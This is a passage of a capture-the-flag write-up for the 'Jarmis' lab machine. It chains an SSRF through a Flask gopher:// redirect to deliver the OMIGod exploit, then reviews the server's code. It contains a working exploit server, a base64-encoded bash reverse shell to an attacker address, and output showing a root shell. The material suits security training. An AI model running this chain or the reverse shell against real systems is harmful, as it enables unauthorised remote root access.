+         &lt;a:Address s:mustUnderstand=</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="s">&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:Address&gt;
+      &lt;/a:ReplyTo&gt;
+      &lt;a:Action&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand&lt;/a:Action&gt;
+      &lt;w:MaxEnvelopeSize s:mustUnderstand=</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="s">&gt;102400&lt;/w:MaxEnvelopeSize&gt;
+      &lt;a:MessageID&gt;uuid:0AB58087-C2C3-0005-0000-000000010000&lt;/a:MessageID&gt;
+      &lt;w:OperationTimeout&gt;PT1M30S&lt;/w:OperationTimeout&gt;
+      &lt;w:Locale xml:lang=</span><span class="sh">"</span><span class="s">en-us</span><span class="sh">"</span><span class="s"> s:mustUnderstand=</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="s"> /&gt;
+      &lt;p:DataLocale xml:lang=</span><span class="sh">"</span><span class="s">en-us</span><span class="sh">"</span><span class="s"> s:mustUnderstand=</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="s"> /&gt;
+      &lt;w:OptionSet s:mustUnderstand=</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="s"> /&gt;
+      &lt;w:SelectorSet&gt;
+         &lt;w:Selector Name=</span><span class="sh">"</span><span class="s">__cimnamespace</span><span class="sh">"</span><span class="s">&gt;root/scx&lt;/w:Selector&gt;
+      &lt;/w:SelectorSet&gt;
+   &lt;/s:Header&gt;
+   &lt;s:Body&gt;
+      &lt;p:ExecuteShellCommand_INPUT xmlns:p=</span><span class="sh">"</span><span class="s">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</span><span class="sh">"</span><span class="s">&gt;
+         &lt;p:command&gt;{}&lt;/p:command&gt;
+         &lt;p:timeout&gt;0&lt;/p:timeout&gt;
+      &lt;/p:ExecuteShellCommand_INPUT&gt;
+   &lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+</span><span class="sh">"""</span>
+</code></pre></div></div>
+<p>There is a <code class="language-plaintext highlighter-rouge">{}</code> in the <code class="language-plaintext highlighter-rouge">&lt;p:command&gt;</code> tag which will be filled in with the <code class="language-plaintext highlighter-rouge">.format()</code> call above.</p>
+<h3 id="flask-server">Flask Server</h3>
+<h4 id="strategy-1">Strategy</h4>
+<p>I’m going to create a webserver that can redirect the Jarmis request to try to exploit OMIGod. I’ve already solved the challenge of getting the request to my server (I did try to have it contact my server directly, but Flask / Python is not in the DB, and therefore it doesn’t make the 11th request).</p>
+<p>The next challenge is getting a POST request via a SSRF. This is challenging. The User Agent above from the server was <code class="language-plaintext highlighter-rouge">curl</code>, which means it could be redirected to make Gopher requests.</p>
+<p>I’ll need one of my redirection methods. I’ll use MSF (but <code class="language-plaintext highlighter-rouge">iptables</code> works just as well). I’ll set the MSF server to redirect to 8443:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 auxiliary(server/jarmisRedirect) &gt;</span><span class="w"> </span><span class="nb">set </span>redirecturl https://10.10.14.6:8443
+<span class="gp">redirecturl =&gt;</span><span class="w"> </span>https://10.10.14.6:8443
+</code></pre></div></div>
+<p>I could actually have <code class="language-plaintext highlighter-rouge">redirecturl</code> be set the the Gopher url that I want to send, but I’d rather troubleshoot in Python, as that’s just easier for me, so I’ll have MSF (or <code class="language-plaintext highlighter-rouge">iptables</code>) redirect to Flask, and Flask redirect to localhost:5985. I’ll try to show the steps to building it, or you can grab the final version as <a href="/files/jarmis-flask.py">jarmis-flask.py</a>.</p>
+<h4 id="hello-world">Hello World</h4>
+<p>To start, I’ll create a simple Flask app that listened on 8443 with TLS and redirects to my box:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>    
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>    
+<span class="k">def</span> <span class="nf">root</span><span class="p">():</span>    
+    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.14.6</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">301</span><span class="p">)</span>
+    
+    
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>    
+    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">ssl_context</span><span class="o">=</span><span class="sh">'</span><span class="s">adhoc</span><span class="sh">'</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8443</span><span class="p">)</span>
+</code></pre></div></div>
+<p>In the last line, <code class="language-plaintext highlighter-rouge">ssl_context</code> is what allows it to run with TLS. <code class="language-plaintext highlighter-rouge">host</code> is necessary else it would only listen on localhost. And I like <code class="language-plaintext highlighter-rouge">debug</code> because I can edit the code and not have to kill and restart the app.</p>
+<p>When I send the scan from Jarmis, it works, redirected by MSF to Flask, and by Flask to <code class="language-plaintext highlighter-rouge">nc</code> listening:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 80
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:53838.
+GET / HTTP/1.1
+Host: 10.10.14.6
+User-Agent: curl/7.74.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</span></code></pre></div></div>
+<h4 id="gopher">Gopher</h4>
+<p>The next question is, can I redirect to a Gopher URL? I’ve shown this before in <a href="/2020/12/19/htb-laser.html#apache-solr-exploit">Laser</a> and <a href="/2020/09/12/htb-travel.html#interaction-with-memcache">Travel</a>. Gopher is nice for this kind of thing because it has no headers. What you put in the URL is the body, so you can use it to write a HTTP POST request.</p>
+<p>I’ll replace the location line in the server with:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">gopher://10.10.14.6:5985/_test</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">301</span><span class="p">)</span>
+</code></pre></div></div>
+<p>On submitting my URL to Jarmis, the redirects lead to this connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 5985
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5985
+Ncat: Listening on 0.0.0.0:5985
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:47660.
+test
+</span></code></pre></div></div>
+<p>It worked! There’s one trick to notice here that is important. If I run that again and save the result to a file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 5985 | <span class="nb">tee test</span>
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5985
+Ncat: Listening on 0.0.0.0:5985
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:42184.
+test
+^C
+</span></code></pre></div></div>
+<p>Looking at that file, there’s a <code class="language-plaintext highlighter-rouge">0x0d0a</code> or <code class="language-plaintext highlighter-rouge">\r\n</code> on the end:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>xxd <span class="nb">test</span> 
+<span class="go">00000000: 7465 7374 0d0a                           test..
+</span></code></pre></div></div>
+<p>This is important because it means I need to add two bytes to the content length or it will be off, which will break things (this took a bunch of troubleshooting to figure out).</p>
+<h4 id="omigod-poc">OMIGod POC</h4>
+<p>To get the OMIGod POC into this, I’ll grab the <code class="language-plaintext highlighter-rouge">DATA</code> variable from the POC, replacing the command with <code class="language-plaintext highlighter-rouge">{}</code> to fill in later. I’ll also create a template for a <code class="language-plaintext highlighter-rouge">REQUEST</code>, with content length and body to populate later (and the <code class="language-plaintext highlighter-rouge">DATA</code> template truncated here with a <code class="language-plaintext highlighter-rouge">...[snip]...</code> for readability):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DATA</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">&lt;s:Envelope xmlns:s=</span><span class="sh">"</span><span class="s">http://www.w3.org/2003/05/soap-envelope</span><span class="sh">"</span><span class="s"> xmlns:a=</span><span class="sh">"</span><span class="s">http://schemas.xmlsoap.org/ws/2004/08/addressing</span><span class="sh">"</span><span class="s"> 
+</span><span class="gp">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+<span class="n">xmlns</span><span class="p">:</span><span class="n">p</span><span class="o">=</span><span class="sh">"</span><span class="s">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</span><span class="sh">"</span><span class="o">&gt;</span>    
+         <span class="o">&lt;</span><span class="n">p</span><span class="p">:</span><span class="n">command</span><span class="o">&gt;</span><span class="p">{}</span><span class="o">&lt;/</span><span class="n">p</span><span class="p">:</span><span class="n">command</span><span class="o">&gt;</span>    
+         <span class="o">&lt;</span><span class="n">p</span><span class="p">:</span><span class="n">timeout</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">p</span><span class="p">:</span><span class="n">timeout</span><span class="o">&gt;</span>    
+      <span class="o">&lt;/</span><span class="n">p</span><span class="p">:</span><span class="n">ExecuteShellCommand_INPUT</span><span class="o">&gt;</span>    
+   <span class="o">&lt;/</span><span class="n">s</span><span class="p">:</span><span class="n">Body</span><span class="o">&gt;</span>    
+<span class="o">&lt;/</span><span class="n">s</span><span class="p">:</span><span class="n">Envelope</span><span class="o">&gt;</span>    
+<span class="sh">"""</span>    
+    
+<span class="n">REQUEST</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">POST / HTTP/1.1</span><span class="se">\r</span><span class="s">
+Host: localhost:5985</span><span class="se">\r</span><span class="s">
+User-Agent: curl/7.74.0</span><span class="se">\r</span><span class="s">
+Content-Length: {length}</span><span class="se">\r</span><span class="s">
+Content-Type: application/soap+xml;charset=UTF-8</span><span class="se">\r</span><span class="s">
+</span><span class="se">\r</span><span class="s">
+{body}</span><span class="sh">"""</span>    
+</code></pre></div></div>
+<p>The HTTP headers need to have <code class="language-plaintext highlighter-rouge">\r\n</code> for each line, but Python on Linux only treats newlines as <code class="language-plaintext highlighter-rouge">\n</code>, so I need to add the <code class="language-plaintext highlighter-rouge">\r</code>.</p>
+<p>Now I’ll update the route to pass the new redirect:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>    
+<span class="k">def</span> <span class="nf">root</span><span class="p">():</span>    
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ping -c 1 10.10.14.6</span><span class="sh">"</span>    
+    <span class="n">data</span> <span class="o">=</span> <span class="n">DATA</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">REQUEST</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">enc_req</span> <span class="o">=</span> <span class="nf">quote</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">gopher://127.0.0.1:5985/_</span><span class="si">{</span><span class="n">enc_req</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">301</span><span class="p">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">quote</code> will URL-encode the string.</p>
+<p>I’m still redirecting to myself so I can see what it looks like, and it looks good:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 5985
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::5985
+Ncat: Listening on 0.0.0.0:5985
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:47688.
+POST / HTTP/1.1
+Host: localhost:5985
+User-Agent: curl/7.74.0
+Content-Length: 1663
+Content-Type: application/soap+xml;charset=UTF-8
+
+&lt;s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema"&gt;
+...[snip]...
+      &lt;p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem"&gt;
+         &lt;p:command&gt;ping -c 1 10.10.14.6&lt;/p:command&gt;
+         &lt;p:timeout&gt;0&lt;/p:timeout&gt;
+      &lt;/p:ExecuteShellCommand_INPUT&gt;
+   &lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+</span></code></pre></div></div>
+<h3 id="remote">Remote</h3>
+<h4 id="ping">Ping</h4>
+<p>Instead of having it send the request to me, I’ll target 5985 on Jarmis:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">gopher://127.0.0.1:5985/_</span><span class="si">{</span><span class="n">enc_req</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">301</span><span class="p">)</span>
+</code></pre></div></div>
+<p>After saving, I’ll send it again. It hits MSF:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Redirecting client 10.10.11.117 to https://10.10.14.6:8443
+</code></pre></div></div>
+<p>Then Flask:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.117 - - [23/Sep/2021 12:05:30] "GET / HTTP/1.1" 301 -
+</code></pre></div></div>
+<p>And finally I see <code class="language-plaintext highlighter-rouge">ping</code> at <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oxdf@parrot$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:05:30.903265 IP 10.10.11.117 &gt; 10.10.14.6: ICMP echo request, id 5, seq 1, length 64
+12:05:30.903286 IP 10.10.14.6 &gt; 10.10.11.117: ICMP echo reply, id 5, seq 1, length 64
+</code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>To avoid worrying about special characters, I’ll just encode a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'</span> | <span class="nb">base64</span> 
+<span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0NDQgMD4mMQo=
+</span></code></pre></div></div>
+<p>Now I’ll update the payload in Flask:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="s">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0NDQgMD4mMQo=</span><span class="sh">'</span><span class="s">|base64 -d|bash</span><span class="sh">"</span>
+</code></pre></div></div>
+<p>On sending, I get a connection back with a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 4444
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.117.
+Ncat: Connection from 10.10.11.117:45574.
+bash: cannot set terminal process group (32938): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Jarmis:/var/opt/microsoft/scx/tmp#
+</span></code></pre></div></div>
+<p>From there I can grab both <code class="language-plaintext highlighter-rouge">user.txt</code> and <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="webserver-setup">Webserver Setup</h3>
+<h4 id="nginx-config">NGINX Config</h4>
+<p>The webserver is NGINX. Looking at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code>, it’s single server proxying various paths:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+
+        root /var/www/html;
+
+        index index.html;
+
+        server_name _;
+        
+        location / {                                
+                # First attempt to serve request as file, then
+                # as directory, then fall back to displaying a 404.
+                try_files $uri $uri/ =404;
+        }
+
+        location /api/ {                            
+                proxy_pass http://127.0.0.1:8001/api/;
+        }                                           
+
+        location /docs {                            
+                proxy_pass http://127.0.0.1:8001/docs;
+        }                                           
+        location /redoc {                           
+                proxy_pass http://127.0.0.1:8001/redoc;
+        }                                           
+        location /openapi.json {
+                proxy_pass http://127.0.0.1:8001/openapi.json;
+        }   
+}
+</code></pre></div></div>
+<p>It’s trying to load static files from <code class="language-plaintext highlighter-rouge">/var/www/html</code> and passing along four paths to the server on TCP 8001.</p>
+<h4 id="uvicorn">uvicorn</h4>
+<p>TCP 8001 is a Python server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Jarmis:~#</span><span class="w"> </span>netstat <span class="nt">-tnlp</span> | <span class="nb">grep </span>8001
+<span class="go">tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      14262/python3
+</span></code></pre></div></div>
+<p>That’s running with <code class="language-plaintext highlighter-rouge">uvicorn</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Jarmis:~#</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>14262
+<span class="go">htb        14262  0.5  0.5  26424 20992 ?        Ss   14:47   0:00 /usr/bin/python3 /usr/local/bin/uvicorn --reload --host 127.0.0.1 --port 8001 app.main:app
+</span></code></pre></div></div>
+<p>That’s actually started by a service through <code class="language-plaintext highlighter-rouge">systemd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Jarmis:~#</span><span class="w"> </span>pstree <span class="nt">-gs</span> 14262
+<span class="go">systemd(1)───uvicorn(14262)─┬─python3(14262)
+                            └─python3(14262)
+</span></code></pre></div></div>
+<p>The service is defined in <code class="language-plaintext highlighter-rouge">/etc/systemd/system/uvicorn.service</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description=Uvicorn systemd service.
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+ExecStart=/opt/app/run.sh
+User=htb
+Group=htb
+RuntimeDirectory=/var/run/uvicorn
+WorkingDirectory=/opt/app
+ExecReload=/bin/kill -s HUP $MAINPID
+KillMode=mixed
+TimeoutStopSec=5
+PrivateTmp=true
+RestartSec=1
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+</code></pre></div></div>
+<p>It runs <code class="language-plaintext highlighter-rouge">/opt/app/run.sh</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nb">export </span><span class="nv">APP_MODULE</span><span class="o">=</span><span class="k">${</span><span class="nv">APP_MODULE</span><span class="p">-app.main</span>:app<span class="k">}</span>
+<span class="nb">export </span><span class="nv">HOST</span><span class="o">=</span><span class="k">${</span><span class="nv">HOST</span><span class="k">:-</span><span class="nv">127</span><span class="p">.0.0.1</span><span class="k">}</span>
+<span class="nb">export </span><span class="nv">PORT</span><span class="o">=</span><span class="k">${</span><span class="nv">PORT</span><span class="k">:-</span><span class="nv">8001</span><span class="k">}</span>
+
+<span class="nb">exec </span>uvicorn <span class="nt">--reload</span> <span class="nt">--host</span> <span class="nv">$HOST</span> <span class="nt">--port</span> <span class="nv">$PORT</span> <span class="s2">"</span><span class="nv">$APP_MODULE</span><span class="s2">"</span>
+</code></pre></div></div>
+<p>This runs <code class="language-plaintext highlighter-rouge">app.main:app</code>, which is the <code class="language-plaintext highlighter-rouge">app</code> object or item from <code class="language-plaintext highlighter-rouge">main.py</code> in the <code class="language-plaintext highlighter-rouge">app</code> directory.</p>
+<h3 id="code-review">Code Review</h3>
+<h4 id="general">General</h4>
+<p>I’m not going into the entire API code, but it’s built on <a href="https://fastapi.tiangolo.com/">FastAPI</a>. <code class="language-plaintext highlighter-rouge">uvicorn</code> is calling the <code class="language-plaintext highlighter-rouge">app</code> object. This is defined as:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span> <span class="o">=</span> <span class="nc">FastAPI</span><span class="p">(</span><span class="n">title</span><span class="o">=</span><span class="sh">"</span><span class="s">Jarmis API</span><span class="sh">"</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="n">description</span><span class="p">,</span> <span class="n">openapi_url</span><span class="o">=</span><span class="sh">"</span><span class="s">/openapi.json</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>There’s also a <code class="language-plaintext highlighter-rouge">api_router</code> object that is created:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">api_router</span> <span class="o">=</span> <span class="nc">APIRouter</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Then routes are created using this object as a decorator, and afterwards they are included into <code class="language-plaintext highlighter-rouge">app</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span><span class="p">.</span><span class="nf">include_router</span><span class="p">(</span><span class="n">api_router</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">fetch</code> route is defined as:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api_router.get</span><span class="p">(</span><span class="sh">"</span><span class="s">/api/v1/fetch</span><span class="sh">"</span><span class="p">,</span> <span class="n">status_code</span><span class="o">=</span><span class="mi">200</span><span class="p">,</span> <span class="n">response_model</span><span class="o">=</span><span class="n">Union</span><span class="p">[</span><span class="n">FetchJarm2</span><span class="p">,</span> <span class="n">FetchJarm1</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">fetch_jarm</span><span class="p">(</span><span class="o">*</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">:</span> <span class="nb">str</span> <span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Query an endpoint to retrieve its JARM and grab metadata if malicious.
+    </span><span class="sh">"""</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">endpoint</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="nf">json</span><span class="p">())[</span><span class="sh">'</span><span class="s">endpoint</span><span class="sh">'</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="bp">None</span>
+    <span class="k">if</span> <span class="sh">'</span><span class="s">//</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">endpoint</span><span class="p">:</span>
+        <span class="n">endpoint</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://</span><span class="sh">'</span> <span class="o">+</span> <span class="n">endpoint</span>
+    <span class="n">o</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">endpoint</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nf">get_jarm</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="n">netloc</span><span class="p">))</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">jarm</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">sig</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">jarm</span><span class="p">[</span><span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">],</span> <span class="n">JARMS</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">ismalicious</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">note</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">note</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">?</span><span class="sh">'</span>
+                <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">server</span><span class="sh">'</span><span class="p">],</span> <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">ismalicious</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">get_header</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="n">netloc</span> <span class="o">+</span> <span class="n">o</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">ismalicious</span><span class="sh">'</span><span class="p">]:</span>
+                    <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">note</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">note</span><span class="sh">'</span><span class="p">]</span>
+
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+                <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">server</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span>
+                <span class="n">resp</span><span class="p">[</span><span class="sh">'</span><span class="s">ismalicious</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">return</span> <span class="n">resp</span>
+</code></pre></div></div>
+<h4 id="11th-request">11th Request</h4>
+<p>When the results come back (each generated by 10 TLS requests), it loops over them, and for each checks if it <code class="language-plaintext highlighter-rouge">ismalicious</code>. If so, there’s a call to <code class="language-plaintext highlighter-rouge">get_header(o.netloc + o.path)</code>. This is what generates 11th request that I observed above, the one I’ll exploit.</p>
+<p><code class="language-plaintext highlighter-rouge">get_header</code> is imported at the top of the file:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">app.lib.getheader</span> <span class="kn">import</span> <span class="n">get_header</span>
+</code></pre></div></div>
+<p>The function actually does a bit of messy stuff to allow for a redirect from <code class="language-plaintext highlighter-rouge">https://</code> to <code class="language-plaintext highlighter-rouge">gopher://</code>, as <code class="language-plaintext highlighter-rouge">requests</code> won’t do that natively (and why it fakes like it’s <code class="language-plaintext highlighter-rouge">curl</code>):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_header</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">malicious</span> <span class="o">=</span> <span class="mi">0</span>
